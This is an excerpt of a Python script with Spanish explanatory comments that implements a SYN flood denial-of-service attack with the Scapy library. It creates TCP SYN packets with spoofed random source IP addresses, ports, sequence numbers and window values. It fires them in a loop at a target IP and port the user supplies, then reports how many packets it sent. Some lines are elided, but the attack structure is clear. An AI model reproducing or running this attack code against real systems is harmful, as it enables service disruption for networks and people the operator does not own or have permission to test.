...
def SYN_Flood(ip_destino,puerto_destino,contador):
    ...
    for x in range (0,contador):
        #Asignamos valores aleatorios al puerto de origen, número de secuencia y window
        puerto_origen = obtener_entero_aleatorio()
        secuencia= obtener_entero_aleatorio()
        win = obtener_entero_aleatorio()
        
        #Creamos un objeto de la clase IP de la librería Scapy
        paquete_IP = IP ()
        #Rellenamos el objeto paquete_IP con:
        #   Dirección IP de origen: aleatoria
        #   Dirección IP de destino: la introducida por el usuario
        #    
        paquete_IP.src = obtener_IP_aleatoria()
        paquete_IP.dst = ip_destino

        #Creamos un objeto de la clase IP de la librería Scapy
        paquete_TCP = TCP ()
        #Rellenamos el objeto paquete_IP con:
        #   Puerto de origen: aleatorio entre 1000 y 9000
        #   Puerto de destino: el introducido por el usuario
        #   Flag: SYN
        #   Número de secuencia: aleatorio entre 1000 y 9000
        #   Window: aleatorio entre 1000 y 9000
        paquete_TCP.sport = puerto_origen
        ...
        #Sumamos 1 al número total de paquetes enviados
        total+=1
    print(f"Paquetes totales enviados: {total}")
...
if __name__ == '__main__':
    try:
        ...
        ip_usuario,puerto_usuario=solicitar_datos_usuario()
        ...
        #Llamamos a la función SYN_flood pasándole los parámetros oportunos
